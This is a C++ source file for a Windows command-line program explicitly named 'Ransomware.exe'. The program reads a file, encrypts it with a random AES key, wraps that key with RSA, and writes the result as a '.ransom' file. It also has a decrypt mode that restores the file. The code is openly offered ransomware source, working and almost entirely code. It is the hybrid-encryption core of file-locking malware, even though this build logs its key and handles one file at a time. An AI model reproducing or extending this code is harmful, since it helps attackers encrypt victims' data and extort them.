#include "includes.h"
#include <cstdio>     // For printf
#include <cstdlib>    // For exit
#include <cstring>    // For _stricmp
#include <algorithm>  // For std::min

BOOL RansomFile(const char* szFileName);
BOOL DeRansomFile(const char* szFileName);

void PrintBuffer(const char* label, const BYTE* buffer, DWORD length) {
    printf("%s [Length: %lu]: ", label, length);
    for (DWORD i = 0; i < length; ++i) {
        printf("%02X", buffer[i]);
    }
    printf("\n");
}

int main(int argc, char** argv) {
    // Ensure the program receives sufficient arguments
    if ((argc > 1) &&
        ((*argv[1] == '-') || (*argv[1] == '/'))) {
        
        // Check for encryption mode
        if (_stricmp("e", argv[1] + 1) == 0) {
            if (argc < 3 || !argv[2]) {
                printf("Error: No file path provided for encryption.\n");
                return 1;
            }

            printf("[INFO] Encryption Mode Selected\n");
            printf("[INFO] File to Encrypt: %s\n", argv[2]);

            BOOL result = RansomFile(argv[2]);
            printf("[INFO] RansomFile returned %d\n", result);

            if (!result) {
                printf("[ERROR] Encryption failed.\n");
            } else {
                printf("[SUCCESS] File successfully encrypted.\n");
            }
        }
        // Check for decryption mode
        else if (_stricmp("d", argv[1] + 1) == 0) {
            if (argc < 3 || !argv[2]) {
                printf("Error: No file path provided for decryption.\n");
                return 1;
            }

            printf("[INFO] Decryption Mode Selected\n");
            printf("[INFO] File to Decrypt: %s\n", argv[2]);

            BOOL result = DeRansomFile(argv[2]);
            printf("[INFO] DeRansomFile returned %d\n", result);

            if (!result) {
                printf("[ERROR] Decryption failed.\n");
            } else {
                printf("[SUCCESS] File successfully decrypted.\n");
            }
        } else {
            goto Dispatch;
        }

        exit(0);
    }

Dispatch:
    // Print usage instructions if no valid command-line arguments are provided
    printf("Usage:\n");
    printf("Ransomware.exe -e [filepath]   Encrypts a file.\n");
    printf("Ransomware.exe -d [filepath]   Decrypts a file.\n");
    return 0;
}

BOOL RansomFile(const char* szFileName) {
    printf("[DEBUG] Starting RansomFile...\n");

    BOOL bResult = FALSE;

    PBYTE pbEncryptedAESKey = nullptr;
    DWORD dwEncryptedAESKeyLen = 0;

    PBYTE pbPlaintextFileData = nullptr;
    DWORD dwPlaintextFileDataLen = 0;

    PBYTE pbEncryptedFileData = nullptr;
    DWORD dwEncryptedFileDataLen = 0;

    BYTE pbKey[16]{};  // AES Key
    DWORD dwKeyLen = sizeof(pbKey);

    BYTE pbIV[16]{};   // AES IV
    DWORD dwIVLen = sizeof(pbIV);

    HANDLE hFile = nullptr;

    char szNewPath[MAX_PATH]{};
    DWORD dwWritten = 0;

    // Step 1: Read the file
    printf("[DEBUG] Reading file: %s\n", szFileName);
    bResult = ReadFileToByteArray(szFileName, &pbPlaintextFileData, &dwPlaintextFileDataLen);
    if (!bResult) {
        printf("[ERROR] Failed to read file.\n");
        goto Cleanup;
    }
    printf("[INFO] File Size: %lu bytes\n", dwPlaintextFileDataLen);

    // Step 2: Generate AES Key and IV
    printf("[DEBUG] Generating AES Key and IV...\n");
    ::BCryptGenRandom(NULL, pbKey, dwKeyLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    ::BCryptGenRandom(NULL, pbIV, dwIVLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    // Log AES Key and IV
    PrintBuffer("AES Key", pbKey, dwKeyLen);
    PrintBuffer("IV", pbIV, dwIVLen);

    // Step 3: Encrypt AES Key using RSA
    printf("[DEBUG] Encrypting AES Key using RSA...\n");
    bResult = RSAEncrypt(pbKey, dwKeyLen, &pbEncryptedAESKey, &dwEncryptedAESKeyLen);
    if (!bResult) {
        printf("[ERROR] RSA Encryption of AES Key failed.\n");
        goto Cleanup;
    }
    printf("[INFO] RSA Encrypted AES Key Length: %lu bytes\n", dwEncryptedAESKeyLen);

    // Step 4: Encrypt File Content
    printf("[DEBUG] Encrypting file content...\n");
    bResult = AESEncrypt(
        pbPlaintextFileData,
        dwPlaintextFileDataLen,
        pbKey,
        dwKeyLen,
        pbIV,
        dwIVLen,
        &pbEncryptedFileData,
        &dwEncryptedFileDataLen
    );
    if (!bResult) {
        printf("[ERROR] AES Encryption failed.\n");
        goto Cleanup;
    }
    printf("[INFO] Encrypted File Content Size: %lu bytes\n", dwEncryptedFileDataLen);

    // Verify the content of encrypted data
    PrintBuffer("Encrypted Content (First 64 Bytes)", pbEncryptedFileData, std::min(64UL, dwEncryptedFileDataLen));

    // Step 5: Write Encrypted Content to File
    printf("[DEBUG] Writing encrypted content to .ransom file...\n");
    strcpy_s(szNewPath, szFileName);
    ::PathRemoveExtensionA(szNewPath);
    strcat_s(szNewPath, ".ransom");

    hFile = ::CreateFileA(
        szNewPath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    if (!hFile || hFile == INVALID_HANDLE_VALUE) {
        printf("[ERROR] Failed to create .ransom file. Error: %lu\n", GetLastError());
        goto Cleanup;
    }

    if (!::WriteFile(hFile, pbIV, dwIVLen, &dwWritten, nullptr)) {
        printf("[ERROR] Failed to write IV. Error: %lu\n", GetLastError());
        goto Cleanup;
    }
    if (!::WriteFile(hFile, pbEncryptedAESKey, dwEncryptedAESKeyLen, &dwWritten, nullptr)) {
        printf("[ERROR] Failed to write RSA Encrypted AES Key. Error: %lu\n", GetLastError());
        goto Cleanup;
    }
    if (!::WriteFile(hFile, pbEncryptedFileData, dwEncryptedFileDataLen, &dwWritten, nullptr)) {
        printf("[ERROR] Failed to write Encrypted File Content. Error: %lu\n", GetLastError());
        goto Cleanup;
    }

    printf("[SUCCESS] Encrypted file written to: %s\n", szNewPath);
    bResult = TRUE;

Cleanup:
    if (hFile)
        ::CloseHandle(hFile);
    if (pbEncryptedAESKey)
        ::HeapFree(::GetProcessHeap(), 0, pbEncryptedAESKey);
    if (pbPlaintextFileData)
        ::VirtualFree(pbPlaintextFileData, 0, MEM_RELEASE);
    if (pbEncryptedFileData)
        ::VirtualFree(pbEncryptedFileData, 0, MEM_RELEASE);

    printf("[DEBUG] RansomFile Complete.\n");
    return bResult;
}

BOOL DeRansomFile(const char* szFileName) {
    printf("[DEBUG] Starting DeRansomFile...\n");

    BOOL bResult = FALSE;

    PBYTE pbCiphertextFileData = nullptr;
    DWORD dwCiphertextFileDataLen = 0;

    PBYTE pbDecryptedFileData = nullptr;
    DWORD dwDecryptedFileDataLen = 0;

    PBYTE pbDecryptedAESKey = nullptr;
    DWORD pbDecryptedAESKeyLen = 0;

    BYTE pbCiphertextKeyData[0x100]{};
    DWORD dwCiphertextKeyData = sizeof(pbCiphertextKeyData);

    BYTE pbKey[16]{};
    DWORD dwKeyLen = sizeof(pbKey);

    BYTE pbIV[16]{};
    DWORD dwIVLen = sizeof(pbIV);

    HANDLE hFile = nullptr;

    char szNewPath[MAX_PATH]{};
    DWORD dwWritten = 0;
    const DWORD dwTotalCount = dwIVLen + dwCiphertextKeyData;

    // Step 1: Read the file
    printf("[DEBUG] Reading file: %s\n", szFileName);
    bResult = ReadFileToByteArray(szFileName, &pbCiphertextFileData, &dwCiphertextFileDataLen);
    if (!bResult) {
        printf("[ERROR] Failed to read file.\n");
        goto Cleanup;
    }
    printf("[INFO] File Size: %lu bytes\n", dwCiphertextFileDataLen);

    // Step 2: Extract IV and RSA Encrypted AES Key
    memcpy(pbIV, pbCiphertextFileData, dwIVLen);
    memcpy(pbCiphertextKeyData, pbCiphertextFileData + dwIVLen, dwCiphertextKeyData);

    // Step 3: Decrypt AES Key using RSA
    printf("[DEBUG] Decrypting AES Key using RSA...\n");
    bResult = RSADecrypt(pbCiphertextKeyData, dwCiphertextKeyData, &pbDecryptedAESKey, &pbDecryptedAESKeyLen);
    if (!bResult) {
        printf("[ERROR] RSA Decryption of AES Key failed.\n");
        goto Cleanup;
    }
    printf("[INFO] RSA Decrypted AES Key Length: %lu bytes\n", pbDecryptedAESKeyLen);

    // Step 4: Decrypt File Content
    printf("[DEBUG] Decrypting file content...\n");
    bResult = AESDecrypt(
        pbCiphertextFileData + dwTotalCount,
        dwCiphertextFileDataLen - dwTotalCount,
        pbDecryptedAESKey,
        pbDecryptedAESKeyLen,
        pbIV,
        dwIVLen,
        &pbDecryptedFileData,
        &dwDecryptedFileDataLen
    );
    if (!bResult) {
        printf("[ERROR] AES Decryption failed.\n");
        goto Cleanup;
    }
    printf("[INFO] Decrypted File Content Size: %lu bytes\n", dwDecryptedFileDataLen);

    // Step 5: Write Decrypted Content to File
    printf("[DEBUG] Writing decrypted content to .clean file...\n");
    strcpy_s(szNewPath, szFileName);
    ::PathRemoveExtensionA(szNewPath);
    strcat_s(szNewPath, ".clean");

    hFile = ::CreateFileA(
        szNewPath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    if (!hFile || hFile == INVALID_HANDLE_VALUE) {
        printf("[ERROR] Failed to create .clean file. Error: %lu\n", GetLastError());
        goto Cleanup;
    }

    if (!::WriteFile(hFile, pbDecryptedFileData, dwDecryptedFileDataLen, &dwWritten, nullptr)) {
        printf("[ERROR] Failed to write Decrypted File Content. Error: %lu\n", GetLastError());
        goto Cleanup;
    }

    printf("[SUCCESS] Decrypted file written to: %s\n", szNewPath);
    bResult = TRUE;

Cleanup:
    if (hFile)
        ::CloseHandle(hFile);
    if (pbDecryptedAESKey)
        ::HeapFree(::GetProcessHeap(), 0, pbDecryptedAESKey);
    if (pbCiphertextFileData)
        ::VirtualFree(pbCiphertextFileData, 0, MEM_RELEASE);
    if (pbDecryptedFileData)
        ::VirtualFree(pbDecryptedFileData, 0, MEM_RELEASE);

    printf("[DEBUG] DeRansomFile Complete.\n");
    return bResult;
}